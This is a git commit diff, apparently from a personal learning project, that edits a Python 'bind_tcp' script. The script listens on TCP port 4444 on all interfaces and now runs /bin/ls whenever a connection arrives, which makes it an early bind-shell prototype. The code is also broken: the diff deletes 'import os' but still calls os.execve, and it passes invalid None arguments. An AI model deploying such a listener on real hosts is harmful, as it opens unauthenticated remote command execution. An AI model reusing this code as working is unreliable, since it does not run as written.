42c51148649cf7d912203f7ef063c8278a855282
troykkt <troydkent@gmail.com>
2016-06-24 13:39:19 -0400

    done with bindtcp python script

--- bind_tcp.py
+++ bind_tcp.py
@@ -2,21 +2,17 @@
 
 import socket
 import sys
-import os
-import signal
 
-HOST = ''
-PORT = 4444
-pid = os.getpid()
+
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.bind(('',4444))
 
 s.listen(10)
-print "socket listening"
-os.kill(pid, signal.SIGUSR1)
+
 while 1:
     connection,address = s.accept()
     data = connection.recv(1024)
-    print data
+    os.execve('/bin/ls',None,None)
